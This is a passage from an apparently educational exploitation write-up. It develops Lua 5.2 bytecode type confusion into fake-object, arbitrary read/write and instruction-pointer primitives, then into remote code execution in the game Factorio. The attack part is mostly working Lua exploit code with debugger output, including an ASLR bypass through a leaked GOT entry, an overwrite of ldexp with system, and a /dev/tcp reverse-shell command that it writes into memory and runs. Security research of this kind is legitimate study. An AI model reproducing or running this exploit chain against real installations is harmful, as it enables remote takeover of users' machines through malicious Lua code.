This seems like a banal question, but it has _implicit consequences_ , if the type of the `TValue` was checked before being able to call it, as it makes sense to do, why would they check the type **during** execution of the function?

_What happens if we replace the LClosure with other type of TValue? Are there type checks to prevent this?_ Let’s experiment with this idea and replace the `LClosure` with a `String`
  
  
  poc = string.dump(function()
  local foo
  local bar
  local target
  (function()
  print(foo)
  print(bar)
  print(target)
  target = "AAAAAAAAAAAAAAAA" -- Replace LClosure with String
  print(target)
  end)()
  end)
  -- Modify upvalue index of target to be idx + 1
  poc = poc:gsub("(\x00\x00\x01\x00\x01\x01\x01)\x02", "%1\x03", 1)
  poc = load(poc)
  poc()
  

Not much seems to happen:
  
  
  [MemoryCorruption src]$ ./lua ~/Downloads/lua-5.2.1/src/poc.lua 
  nil
  nil
  LClosure: 0x1c57e20
  AAAAAAAAAAAAAAAA
  

_Why is that?_ As we are not calling any other function after overwritting the `LClosure`, **its value is not being used**.

_But what happens if we corrupt the previous`LClosure`? How does that affect the execution when Lua returns to the function?_ Let’s see it
  
  
  poc = string.dump(function()
  local foo
  local bar
  local target
  (function() -- [1] target points to this function LClosure
  (function()
  print(foo)
  print(bar)
  print(target)
  -- [2] The inner function overwrites the outer function LClosure
  target = "AAAAAAAAAAAAAAAA"
  -- [3] Lua returns to the corrupted LClosure
  end)()
  end)()
  end)
  -- Modify upvalue index of target to be idx + 1
  poc = poc:gsub("(\x00\x00\x01\x00\x01\x01\x01)\x02", "%1\x03", 1)
  poc = load(poc)
  poc()
  

This time the inner function is overwritting the `LClosure` of the outer function instead of modiying their own `LClosure`
  
  
  [MemoryCorruption src]$ ./lua poc.lua 
  nil
  nil
  LClosure: 0x21b1130
  Segmentation fault (core dumped)
  

We can see in GDB that the crash happens because Lua is **trying to use our TValue as a LClosure in the change of frame code**
  
  
  ──[ REGISTERS ]

  612  for (;;) {
  613  Instruction i = *(ci->u.l.savedpc++);
  614  StkId ra;
  

These are great news, as now the `cl` variable, that points to the current `LClosure` in **execution** , is pointing to our `TString` and not to the real `LClosure`.

This is possible because the **type check in the return opcode is not enforced**. Instead of forcing a type check, like in the `luaD_precall` function before a call, the `lua_assert` macro is used, and as we learned before, it **does nothing by default**
  
  
  vmcasenb(OP_RETURN,
  int b = GETARG_B(i);
  if (b != 0) L->top = ra+b-1;
  if (cl->p->sizep > 0) luaF_close(L, base);
  b = luaD_poscall(L, ra);
  if (!(ci->callstatus & CIST_REENTRY))  /* 'ci' still the called one */
  return;  /* external invocation: return */
  else {  /* invocation via reentry: continue execution */
  ci = L->ci;
  if (b) L->top = ci->top;
  // This type check would prevent this type confusion,
  // but is disabled by default
  lua_assert(isLua(ci));
  lua_assert(GET_OPCODE(*((ci)->u.l.savedpc - 1)) == OP_CALL);
  goto newframe;  /* restart luaV_execute over new Lua function */
  }
  )
  

To understand how we can leverage this, we first need to know **what attributes we are in control of** when we confuse a `TString` with a `LClosure`

Bytes | LClosure | TString  
---|---|---  
0-7 | GCObject *next | GCObject *next  
8 | lu_byte tt | lu_byte tt  
9 | lu_byte marked | lu_byte marked  
10 | lu_byte nupvalues | lu_byte extra  
11-15 | Padding | Padding + unsigned int hash  
16-23 | GCObject *gclist | size_t len  
24-31 | **Proto *p** | **start of user content**  
32-40 | **Upval **upval** | **rest of string**  
  
As we can see, **the type confusion gives us total control** of both the `Proto` and `Upval` pointers, as the user content of a **string** is stored in those offsets.

This is important because we gain control over the **pointer to the function prototype and the array of upvalues of the current frame**. If we point these pointers to an area of memory we control, for example, _another string_ , we could create **fake objects** , the **most powerful primitive in a dynamic language**.

### Creating Fake Objects

From this point, there are two paths, we either create a Fake `Proto` that points to an array of fake `TValues`, or we can create a fake `UpVal` array that points to our `TValues`. They lead to the same outcome, so I recomment following the _Constants_ path, as you need **less padding** , and also **regain the ability to use constants** in your function, which is nice

![Fake Objects](/posts/rce-lua-factorio/fakeobjs.svg) Possible paths to create Fake Objects from a LClosure we control

Let’s start by creating a **fake string**. Fake strings are interesting as they can be used as a **read primitive** by creating a one with the **max length possible**.

This is useful in many cases and can even be the end goal of our exploit (as we might just want to _demonstrate access to customer data in memory_)

As we will follow the **path of constants** , we need to create:

  * The Fake String
  * An array of `TValues`, with one pointing to our fake string
  * A Fake `Proto` that points to the Array of `TValues`
  * A Fake `LClosure` that points to our fake `Proto`

#### 1\. Fake String

In Lua, strings are represented with the `TString` union:

While crafting fake objects, use the definition of the structure provided by GDB, as it includes **paddings**
  
  
  pwndbg> ptype /o TString
  
  type = union TString {
  /*  8 */  L_Umaxalign dummy;
  /*  24 */  struct {
  /*  0  |  8 */  GCObject *next;
  /*  8  |  1 */  lu_byte tt;
  /*  9  |  1 */  lu_byte marked;
  /*  10  |  1 */  lu_byte extra;
  /* XXX  1-byte hole  */
  /*  12  |  4 */  unsigned int hash;
  /*  16  |  8 */  size_t len;
  /* total size (bytes):  24 */
  } tsv;
  /* total size (bytes):  24 */
  }
  

As our goal is to **create a string with an arbitrary len** , our string will have 24 bytes where the last 8 bytes represent the length of our string
  
  
  -- Convert little endian uint64 to char[8]
  local function ub8(n)
  local t = {}
  for i = 1, 8 do
  local b = n % 256
  t[i] = string.char(b)
  n = (n - b) / 256
  end
  return table.concat(t)
  end
  
  --  next + tt/marked/extra/padding/hash + len
  fakeStr = ub8(0x0) .. ub8(0x0) .. ub8(0x1337) 
  

#### 2\. Fake Array of TValues

Next, we need to create the `TValue` that points to this `TString`, as we already know, `TValues` have two parts, the `Value` and the `type`
  
  
  pwndbg> ptype /o TValue
  
  type = struct lua_TValue {
  /*  0  |  8 */  Value value_;
  /*  8  |  4 */  int tt_;
  /* XXX  4-byte padding  */
  /* total size (bytes):  16 */
  }
  

So we have to create a string with **two 64 bit values** , the first will be a _pointer_ to the fake `TString` we created before, and the second the type of the `TValue`

Remember that a `TString` has a header of **24 bytes before the user data** , so we need to take that into account while calculating pointers to the content of the string 
  
  
  -- Value + Type (LUA_TSTRING = 4)
  fakeTValueArray = ub8(addr_of(fakeStr) + 24) .. ub8(4)
  

If we wanted to add another fake object, we just have to concat it as this is supposed to be an array of `TValues`
  
  
  -- Value + Type (LUA_TSTRING = 4) / Value + Type (LUA_TNUMBER = 3)
  fakeTValueArray = ub8(addr_of(fakeStr) + 24) .. ub8(4) ..  ub8(0) .. ub8(3)
  

#### 3\. Fake Proto

Then we need to create a **Fake Proto** that points to our fake array of `TValues`
  
  
  pwndbg> ptype /o Proto
  type = struct Proto {
  /*  0  |  8 */  GCObject *next;
  /*  8  |  1 */  lu_byte tt;
  /*  9  |  1 */  lu_byte marked;
  /* XXX  6-byte hole  */
  /*  16  |  8 */  TValue *k;
  /*  24  |  8 */  Instruction *code;
  /*  32  |  8 */  struct Proto **p;
  /*  40  |  8 */  int *lineinfo;
  /*  48  |  8 */  LocVar *locvars;
  /*  56  |  8 */  Upvaldesc *upvalues;
  /*  64  |  8 */  union Closure *cache;
  /*  72  |  8 */  TString *source;
  /*  80  |  4 */  int sizeupvalues;
  /*  84  |  4 */  int sizek;
  /*  88  |  4 */  int sizecode;
  /*  92  |  4 */  int sizelineinfo;
  /*  96  |  4 */  int sizep;
  /*  100  |  4 */  int sizelocvars;
  /*  104  |  4 */  int linedefined;
  /*  108  |  4 */  int lastlinedefined;
  /*  112  |  8 */  GCObject *gclist;
  /*  120  |  1 */  lu_byte numparams;
  /*  121  |  1 */  lu_byte is_vararg;
  /*  122  |  1 */  lu_byte maxstacksize;
  /* XXX  5-byte padding  */
  
  /* total size (bytes):  128 */
  }
  

In our case, as we are only interested in controlling the `k` pointer (the pointer to the constants), we can do this:
  
  
  -- Fake proto that points the constants array
  fakeProto = ub8(0x0) .. ub8(0x0) .. ub8(addr_of(fakeTValueArray) + 24)
  

#### 4\. Fake LClosure

Finally, we create a fake `LClosure` that points to our fake `Proto` structure. As the user content of a string perfectly aligns with the location of the `Proto` pointer in a real `LClosure`, creating it is straighforward:
  
  
  fakeClosure = ub8(addr_of(fakeProto) + 24)
  

With this fake `LClosure`, we now have all the parts needed to craft an object. We will update the code that replaces the `LClosure` with the following that also returns the crafted object
  
  
  craft_object = string.dump(function(closure)
  local target
  return (function(closure) -- [1] target points to this function LClosure
  (function(closure)
  -- [2] The inner function overwrites the outer function LClosure
  target = closure
  end)(closure)
  -- [3] The LOADK opcode reads the constant
  -- from our fake LCLosure array of constants,
  -- so instead of 42 this returns our fake object
  return 42
  -- We need to return an additional value to prevent a TAILCALL
  -- that would mess up with the Call frame
  end)(closure), 1337
  end)
  -- Replace the stack index of target upval to point to the LCLosure
  -- of the first function
  craft_object = craft_object:gsub("(target\x00\x01\x00\x00\x00\x01)\x01", "%1\x02", 1)
  craft_object = load(craft_object)
  

Notice how we both return the result of the inner function (the crafted object) and a constant `1337`. We do this because when doing `return function()`, Lua uses a `TAILCALL` opcode to do the call. This opcode allows **infinite recursion** without growing the stack, as the current call frame will be used for the inner function.

This is **not what we want** , the change of frame needs to happen so our fake `LClosure` gets used as the current frame. By also returning a constant we prevent Lua from using a `TAILCALL` operation, **forcing a change of frame**.

With this updated piece of code, we just have to call the `craft_object` primitive with our fake `LCLosure` to obtain our fake object.
  
  
  read_primitive = craft_object(fakeClosure)
  print(string.format("Size of string: %x", #read_primitive))
  --Output: Size of string: 1337
  

### The Tables Have Turned

From this point, with the ability to create fake objects, all the features of Lua are now your **weapons** :

  * **TStrings** : allow to **leak data**
  * **Tables** : can be used to write data to arbitrary addresses
  * **CCLosure/Light C Functions** : allow to _obtain control of the instruction pointer_. Which has multiple uses: 
  * **Bypass sandboxes** : we can recover access to Lua functions that might be sandboxed but still present in the binary by pointing a fake function to its address
  * **Execute ROP Chains** : as we control the instruction pointer, we can execute _ROP chains_

The path to take will depend both on your goals and the application where Lua is embedded.

### Generic Primitives

#### Finishing our read primitive

Previously, we created our **first fake object** , a `TString`. We already said that this is a powerful fake object, as it can be used to leak data, so let’s finish building this read primitive.

To do this, we start by updating the size of our fake string from `0x1337` to a bigger number, so we can reach more data from its position.
  
  
  --  next + tt/marked/extra/padding/hash + len
  fakeStr = ub8(0x0) .. ub8(0x0) .. ub8(0x20000000000000) 
  

Now, we need to create a function that given a fake string, tries to read from an address we provide. As we already know, Lua assumes that the string is located after the `TString` header, that means that **we are limited to leaking data after the header**. As `TStrings` are located in the _heap_ , we will only be able to read data located in the heap or after it.

The following code can be used to read data from an address we provide given a fake string that is within reach of the target:

In Lua, **Strings are indexed starting from 1**. This means that `str:sub(0, 1)` and `str:sub(1, 1)` return the same character. To take that into account we will consider the header of the `TString` one byte smaller 
  
  
  function read(fake_string, addr, size)
  -- First we calculate if the address is reachable from our position
  local relative_addr = addr - (addr_of(fake_string) + 23)
  
  if relative_addr < 0 then
  print("[-] Cannot read from " .. addr)
  error()
  end
  
  -- Then we obtain the part of the string where the data is located
  return fake_string:sub(relative_addr, relative_addr + size - 1)
  end
  

#### Building a Write-What-Where Primitive

In addition to leaking memory, we would like to **corrupt memory** so we can alter the behaviour of the program.

There are multiple ways to do this, so we are going to do the one that I think is the **simplest**.

The idea is to create a _fake UpValue_ that points to the address we want to write. By doing this, Lua will think that the address we provided contains a `TValue`, so this is similar to the way we crafted fake objects, but the diference is that instead of retrieving this fake object, we are going to **overwrite it with a numeric value**.

_Why are we going to do this?_ Because writing to a variable means to change the **underlying TValue** with a new `TValue` that represents the new object. As Lua thinks the address we provide contains the `TValue` of the variable we are writing to, Lua is going to write the new `TValue` in that position, and as we already know, **numeric values are stored inline** in the `TValue` structure, so **we control the first 8 bytes of the structure that gets written** to the address provided.
  
  
  write_primitive = string.dump(function(closure, value)
  local target
  (function(closure, value) -- [1] target points to this function LClosure
  (function(closure)
  -- [2] The inner function overwrites the outer function LClosure
  target = closure
  end)(closure)
  -- [3] Target now points to the address we want to write to.
  -- Changing its value means writting a TValue in that address
  target = value
  end)(closure, value)
  end)
  write_primitive = write_primitive:gsub("(target\x00\x01\x00\x00\x00\x01)\x02", "%1\x03", 1)
  write_primitive = load(write_primitive)
  

Unfortunately, in the process we will also **corrupt the next 8 bytes with the type of the TValue** , but this might be okay depending on where we are writting to.
  
  
  type = struct lua_TValue {
  /*  0  |  8 */  Value value_;
  /*  8  |  4 */  int tt_;
  /* XXX  4-byte padding  */
  /* total size (bytes):  16 */
  }
  

Implementation is really simple. We start by creating a fake `UpVal` structure inside a string that points to the address where we want to write:
  
  
  pwndbg> ptype /o UpVal
  type = struct UpVal {
  /*  0  |  8 */  GCObject *next;
  /*  8  |  1 */  lu_byte tt;
  /*  9  |  1 */  lu_byte marked;
  /* XXX  6-byte hole  */
  /*  16  |  8 */  TValue *v;
  /*  24  |  16 */  union {
  /*  16 */  TValue value;
  /*  16 */  struct {
  /*  24  |  8 */  struct UpVal *prev;
  /*  32  |  8 */  struct UpVal *next;
  /* total size (bytes):  16 */
  } l;
  
  /* total size (bytes):  16 */
  } u;
  
  /* total size (bytes):  40 */
  }
  

That means the following code:
  
  
  -- next/tt/marked + Address of the TValue (v)
  fakeUpVal = "AAAABBBBCCCCDDDD".. ub8(addr)
  

Then, is just a matter of creating a fake `LClosure` where we control the `UpVals` array
  
  
  -- proto + upvals
  fakeClosure = ub8(addr_of("MemoryCorruption")) .. ub8(addr_of(fakeUpVal) + 24)
  

Our primitive will be like the following:
  
  
  function write(addr, value)
  -- The Fake Upval points to the destination of the write
  fakeUpVal = "AAAABBBBCCCCDDDD".. ub8(addr) -- next/tt/marked + v
  
  -- Fake closure that we use to overwrite the real closure
  fakeClosure = ub8(addr_of("MemoryCorruption")) .. ub8(addr_of(fakeUpVal) + 24) -- proto + upvals
  
  write_primitive(fakeClosure, value)
  end
  
  write(0x4545454545, 0x5050505050)
  

With these changes, we now have an arbitrary write primitive. However, **floating-point numbers** strike again…

##### Episode V - Doubles Strike Back

Now we have the _opposite problem_ to the one we explained at IEEE-754 Double-precision . We have a double that we want to transform into an integer. As we already know, Lua only uses doubles, so we have to play with the encoding of doubles to obtain the binary representation that we are looking for

In this case, there is an easy reasoning to obtain this transformation. We are gonna assume that we **only want to write values that fit the mantissa** of a double, as its not that useful to write incorrect data.

That means that **we want an exponent full of zeroes**. As we already know, that is an especial value in _floating-point numbers_ that means that it is a **denormalized number** , that is, a **very small number**. _What is the smallest number we can have?_ In the case of denormalized numbers, the value of a double is calculated as follows:
  
  
  (-1)**sign * 2**(1-1023) * 0.mantissa = (-1)**sign * 2**-1022 * 0.mantissa
  

So it basically is `2**-1022 * smallest_mantissa_possible`. _What is the smallest mantissa possible?_ As we have 52 bits of precision, that would be `2**-52`. So that means that the smallest number representable is:
  
  
  (-1)**sign * 2**-1022 * 2**-52 = (-1)**sign * 2**-1074
  

We can check this with the same Python code we used to convert from `double` to `integer`
  
  
  Exponent: 00000000000
  Mantissa: 000000000000***REDACTED-SUSPECT-TOKEN***  Number:  0x1
  

As expected, the exponent is zero, as it is a denormalized number, and only the last bit is set, so it is the **smallest representable number**.

All this means that _if we multiply our double with this value_ , we will get **a double representation that encodes our number in the same way as an integer**.
  
  
  double = 0x50505050 * 2**-1074
  
  double_bytes = struct.pack('<d', double)
  number = struct.unpack("<q", double_bytes)[0]
  
  # Take into account that 2 bytes is the prefix
  encoded = format(number, "#065b")[2:]
  
  exponent = encoded[:11]
  mantissa = encoded[11:]
  
  print(f"Exponent: {exponent}")
  print(f"Mantissa: {mantissa}")
  print(f"Integer: {hex(number)}")
  print(f"Double: {double}")
  
  # Output:
  # Exponent: 00000000000
  # Mantissa: 000000000000***REDACTED-SUSPECT-TOKEN***  # Integer: 0x50505050
  # Double: 6.657241696e-315
  

So our code to encode an `integer` in a `double` in Lua is as simple as:
  
  
  function integer_to_double(integer)
  return integer * 2^-1074
  end
  

With this small change our write primitive is complete:
  
  
  function integer_to_double(integer)
  return integer * 2^-1074
  end
  
  function write(addr, value)
  -- Encode double as an integer
  value = integer_to_double(value)
  
  -- The Fake Upval points to the destination of the write
  fakeUpVal = "AAAABBBBCCCCDDDD".. ub8(addr) -- next/tt/marked + v
  
  -- Fake closure that we use to overwrite the real closure
  fakeClosure = ub8(addr_of("MemoryCorruption")) .. ub8(addr_of(fakeUpVal) + 24) -- proto + upvals
  
  write_primitive(fakeClosure, value)
  end
  
  write(0x4545454545, 0x5050505050)
  

We can check in GDB that the correct value is written:

#### Controlling the Instruction Pointer

Another generic primitive that will be useful in most cases is the ability to control the instruction pointer. To do this, we can either fake a `CClosure` or a `Light C Function`. In this case, we are going to use a `Light C Function`, because this also **reveals a useful leak that we don’t know yet**. The difference between both is that a `CCLosure` can have upvalues, while a `Light C Function` can not.

As seen in the code, a light function is a variant of the function type and has value `22`.
  
  
  #define LUA_TFUNCTION		6
  #define LUA_TLCF	(LUA_TFUNCTION | (1 << 4))  /* light C function */
  

As there are no upvalues, a light function contains the **pointer of the function inline in the TValue** , so the following is a valid `TValue` of type `Light C Function` that points to a function at `0xdeadbeef`
  
  
  -- Pointer + Type (LUA_TLCF = 22)
  fakeTValueArray = ub8(0xdeadbeef) .. ub8(22)
  

We can craft this fake function as any other object and call it as any other function
  
  
  -- Pointer + Type (LUA_TLCF = 22)
  fakeTValueArray = ub8(0xdeadbeef) .. ub8(22)
  
  -- Fake proto that points the constants array
  fakeProto = ub8(0x0) .. ub8(0x0) .. ub8(addr_of(fakeTValueArray) + 24)
  fakeClosure = ub8(addr_of(fakeProto) + 24)
  
  fake_function = craft_object(fakeClosure)
  -- Call the fake function
  fake_function()
  

Doing this will result in control of the instruction pointer, as seen in GDB
  
  
  Program received signal SIGSEGV, Segmentation fault.

This is interesting for **two reasons** , the obvious one is that controlling the instruction pointer allow us to further alter the behaviour of the program and opens the door to ROP chains and such, but the other reason is that as the **pointer of a Light C Function is stored inline we can leak it** with our address leak primitive.

This is great because **functions in Lua are implemented as light C functions** , and that means that **this is an straighforward way to bypass ASLR**.
  
  
  print(string.format("Print at: 0x%x", addr_of(print)))
  

This can be used to bypass ASLR and then **calculate the address of a sandboxed function** to then call it with another fake function to bypass the sandbox

# Getting Remote Code Execution on Linux

With all these primitives, we now have multiple ways to get RCE in Factorio. We could, for example, make a ROP chain with a fake function to execute code in the target. However, that is not that interesting, we are going to follow a different path so we can play some more tricks and avoid having to write a chain.

The exploitation path is going to be the following:

  1. Find an **imported function that we can call from Lua** code where we _control the first parameter passed_
  2. **Replace the address of this function with the address of system** in the _GOT_
  3. Call the function with the address of a string to execute commands in the system

For those unfamiliar with Linux exploitation, the _Global Offset Table_ (GOT) contains the **address of globals** so they can be located in _Position Independent Code_. One of the things stored in the GOT are the **resolved addresses of shared libraries functions**. When our code wants to call a function such as `printf`, it is going to use the address stored in GOT, if we can overwrite an entry, we can make it **call a different function with the parameters of the original function**.

This will prove useful as fake functions **don’t give us the ability to pass parameters following the calling convention** (that is, using registers such as `RDI`), so we could call `system` but without control of the parameters, which is not great.

If we **find a shared library function that is callable from Lua where the first parameter is controlled by us** , we could replace its address with the address of `system` to execute commands, as we would have control of the parameter expected by it.
  
  
  int system(const char *command);
  

## 0\. Integration Hell?

Until now, all our testing was done on the _official Lua interpreter_10, as it was easier and faster to work with. By doing this, we trusted that the modified implementation used in Factorio didn’t diverge too much from the official one. In this section, we will make the modifications needed to run our primitives in Factorio.

In Factorio, **Garbage Collected Objects** , that is things like `TString`, `LClosure` or `Proto` have an extra pointer as part of the `CommonHeader`.

Factorio:
  
  
  #define CommonHeader	GCObject *previous; GCObject *next; lu_byte tt; lu_byte marked
  

Official Lua Intepreter:
  
  
  #define CommonHeader	GCObject *next; lu_byte tt; lu_byte marked
  

It seems that in Factorio objects are part of a _double linked list_ , while they are usually part of a _single linked list_.

For our purposes, this means that some offsets are off by `8`. For example, the header of a `TString` is no longer `24` but `32`, which breaks our calculation to locate the content of a string and our read primitive.
  
  
  function read(fake_string, addr, size)
  -- First we calculate if the address is reachable from our position
  local relative_addr = addr - (addr_of(fake_string) + 31)
  
  if relative_addr < 0 then
  print("[-] Cannot read from " .. addr)
  error()
  end
  
  -- Then we obtain the part of the string where the data is located
  return fake_string:sub(relative_addr, relative_addr + size - 1)
  end
  

In addition to changing the calculation of `TString` addresses, we also have to modify our write primitive, as there is an additional pointer before the `TValue` pointer:
  
  
  function write(addr, value)
  -- Encode double as an integer
  value = integer_to_double(value)
  
  -- The Fake Upval points to the destination of the write
  fakeUpVal = "AAAABBBBCCCCDDDDEEEEFFFF".. ub8(addr) -- previous/next/tt/marked + v
  
  -- Fake closure that we use to overwrite the real closure
  fakeClosure = ub8(addr_of("MemoryCorruption")) .. ub8(addr_of(fakeUpVal) + 32) -- proto + upvals
  
  write_primitive(fakeClosure, value)
  end
  

However, with only this change our exploit will make the game crash while trying to dereference an invalid pointer.
  
  
  mov  rax, qword ptr [rax + 0x18]  RAX, [0xfe32704c00000000]
  # Cannot dereference [0xfe32704c00000000]
  

That looks like a _really corrupted pointer_ and we already fixed our offsets, so that means…

### It’s not Doubles, There’s no way it’s Doubles, It was Doubles

Unfortunately for us, Factorio seems to be using a version of _sprintf_ that uses a different encoding when the format string `%a` is used11. This is breaking our conversion from a _fake double_ to a real double.

For example, if we leak the value `2.1038461432219e-316` we would expect the following string after calling `string.format("%.13a", 2.1038461432219e-316)`:
  
  
  0x0.000000289c130p-1022 -> 0x289c130
  

However, we instead got:
  
  
  0xa.2704c00000000p-1052 -> 0xfe32704c00000000
  

This completely breaks the code we made. Maybe depending on libraries _was not a great idea_.

Now that we have a better understanding of doubles, **let’s write a completely numeric approach** , like is done in other writeups 12

As we know, `2^-1074` is the smallest number possible, as it is a denormalized number with only the last bit set
  
  
  Exponent: 00000000000
  Mantissa: 000000000000***REDACTED-SUSPECT-TOKEN***We used this to force a representation of an integer in a double, but we can actually do the **opposite operation**.

Let’s see it with an example. Imagine we leak the pointer `0x289c130` using our leak primitive, if we try to print it, we get the value `2.1038461432219e-316`, _how can we get the original number?_

The trick is in understanding that in denormalized form, the position of the bits in the mantissa matter, as bits to the right represent smaller numbers. This is why even if all pointers are integers, they don’t have the same exponent when considered a double, as the position of the rightmost bit changes
  
  
  Exponent 00000000000
  Mantissa: 000000000000***REDACTED-SUSPECT-TOKEN***This behaviour can make us think that the operation we need to do depends on the exponent provided by Lua, while in reality **it does not matter at all**. Think about it, no matter the integer, the value always starts at the rightmost bit, so in reality, we can consider **all integers to have exponent -1074** when represented as a double, which is exactly what we did in the oppsite operation.

So all this means that by doing `leak * 2**1074` we can recover the original number

We have to split the multiplication in two parts as `2**1074` is not representable as a double (remember that the highest exponent is `1023`) 
  
  
  function double_to_number(double)
  return double * 2^52 * 2^1022
  end
  

You can also see it in the following way: the first multiplication makes sure the number is no longer _denormalized_ , as they are represented in the mantissa, which has **52 bits** , while the second multiplication makes the exponent positive, as the smallest negative exponent in a normal number is `-1022`. After doing this, the double now properly encodes the integer leaked

## 1\. Function to replace with System

Now that our primitives work in Factorio, let’s finally get to RCE. First, for our idea to work, we need an imported function that we can call from Lua for which we control the first parameter.

The Lua version in Factorio is pretty limited in terms of available libraries, but fortunately, the `math` library has a perfect example of this at `math_ldexp`
  
  
  static int math_ldexp (lua_State *L) {
  lua_pushnumber(L, l_tg(ldexp)(luaL_checknumber(L, 1), luaL_checkint(L, 2)));
  return 1;
  }
  

We can see on gdb that the second parameter is passed as the first parameter (RDI) on the libc call
  
  
  math.ldexp(0, 0x454545454) -- This will call system(0x289c150)
  
  
  
  Thread 24 "factorio" hit Breakpoint 2.3, __ldexp (value=0, exp=1414812756) at ./s_ldexp_template.c:22
  22	{
  LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
  ──────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────────────
  *RAX  0x160
  *RBX  0x7fff9400ded0 ◂— 0x0
  *RCX  0x7fff94059660 ◂— 0x0
  *RDX  0x7fff94059650 —▸ 0x1ab8ea0 (math_ldexp(lua_State*)) ◂— push rbp
  *RDI  0x54545454
  

This makes this function suitable to be replaced with the address of system, as we already know that the command is passed as the first parameter
  
  
  int system(const char *command);
  

## 2\. Replacing the Address of ldexp with system

Now that we found a function that is suitable to be replace with system, we need to overwrite it’s address with the address of system, but to do that, we first need to locate system in memory, as the target has **ASLR enabled**.

This shouldn’t be a problem, right? We have our read primitive. However, there is a _small problem_ , the GOT table is located before the Heap, so our read primitive is unable to leak it, as we can only leak data **after our string header**.

We could search in heap for pointers to libc but that is not as reliable, is there anything we can do to avoid this? Yes, there is.

As we also have a write-what-where primitive, why don’t we craft a `TString` before the GOT table? It should be possible, right?

There are two ways to do this, we could search in memory for some data that resembles a `TString` structure before the GOT that we can use as our fake `TString`, our we can write our own.

In this case, as there is a writable segment before the GOT, we can just use that

  regular  [0x000000000289df00-0x000000000289ef90)  rw- got.pl
  

With our primitives is very straighforward to create this fake string before the GOT and return it as a fake object
  
  
  -- Clear previous fields and write arbitrary len
  write(0x289c130, 0x0)
  write(0x289c138, 0x0)
  write(0x289c140, 0x0)
  write(0x289c148, 0xfffffffffffffff)
  
  -- Here we create a fake TValue that points to our fake TString before the GOT
  -- Value + Type (LUA_TSTRING = 4)
  fakeTValue = ub8(0x289c130) .. ub8(4)
  
  -- Array of Upvals
  -- previous + next + tt/marked/padding + v
  fakeUpVal = ub8(0x0) .. ub8(0x0) .. ub8(addr_of(fakeTValue) + 32)
  
  -- Fake proto that points the constants array
  fakeConstant = ub8(0) .. ub8(3) -- Value + Type (LUA_TNUMBER = 3)
  -- previous + next + tt/marked/padding + k
  fakeProto = ub8(0x0) .. ub8(0x0) .. ub8(0x0) .. ub8(addr_of(fakeConstant) + 32)
  
  -- Fake closure that we use to overwrite the real closure
  -- proto + upvals (-8 as in Factorio UpVal has an
  -- extra pointer that breaks alignment)
  fakeClosure = ub8(addr_of(fakeProto) + 32) .. ub8(addr_of(fakeUpVal) + 32 - 8)
  
  fakeObjects = {}
  fake = poc(fakeClosure, fakeObjects) -- Replace Closure with our fake TValue
  
  print(string.format("Size of string: %x", #fakeObjects[0]))
  

With this, we can easily leak the address of a libc function to bypass ASLR
  
  
  -- Leak pointer from GOT
  memcpy = ubNumber(read(fakeObjects[0], 0x289df40, 8))
  print("[*] memcpy addr: 0x" .. string.format("%x", memcpy))
  
  -- Offsets for LIBC 2.38 (Fedora 39)
  libc_base = memcpy - 0x138b80
  system = libc_base + 0x2a3b0
  print("[*] LIBC: 0x" .. string.format("%x", libc_base))
  print("[*] system: 0x" .. string.format("%x", system))
  

After calculating the position of system, we can overwrite the GOT entry with it
  
  
  -- Corrupting ldexp with system address
  write(0x289ef00, system)
  print("[*] Corrupted ldexp addr")
  

## 3\. Executing commands

Now that we have a way to call system from Lua code, let’s try to execute a command. We will execute `sh -c "sh -i >& /dev/tcp/127.0.0.1/9001 0>&1 &"` to obtain a remote shell.

We can store the command in a Lua string and then call ldexp with this address
  
  
  cmd = 'sh -c "sh -i >& /dev/tcp/127.0.0.1/9001 0>&1 &"'
  math.ldexp(0, addr_of(cmd) + 32)
  

However, we never get a shell, _what is happening?_ We attach gdb to the program and break on the call to system, by doing this, we notice the problem: **Lua calls ldexp with a 32 bit parameter** , breaking our address
  
  
  *RDI  0x9400f870
  *R12  0x7fff9400f870 ◂— 'sh -c "sh -i >& /dev/tcp/127.0.0.1/9001 0>&1 &"'
  

Fortunately, we already have a workaround, **writing the command in the same segment we used to store the fake string**. As PIE is not enabled (which is basically ASLR for the main binary), binary addresses are small enough for this
  
  
  -- Write command sh -c "sh -i >& /dev/tcp/127.0.0.1/9001 0>&1 &"
  write(0x289c150, 0x2d206873)
  write(0x289c154, 0x73222063)
  write(0x289c158, 0x692d2068)
  write(0x289c15C, 0x20263e20)
  write(0x289c160, 0x7665642f)
  write(0x289c164, 0x7063742f)
  write(0x289c168, 0x3732312f)
  write(0x289c16C, 0x302e302e)
  write(0x289c170, 0x392f312e)
  write(0x289c174, 0x20313030)
  write(0x289c178, 0x31263e30)
  write(0x289c17C, 0x222620)
  
  print("[*] Executing shell")
  math.ldexp(0, 0x289c150) -- This will call system(0x289c150)
  

This time, our exploit works and we recieve a remote shell

## Your Turn

After reading this post, I hope you gained a good understanding of how Lua bytecode works and how it can be leveraged.

As I think the best way to learn something is by practicing, I made a small challenge in which you have to escape from a Lua interpreter and execute a Javascript function that is not callable by Lua code.

You can find it here: [Escape from Alcawasm](https://alcawasm.memorycorruption.net/) . I hope you have fun!
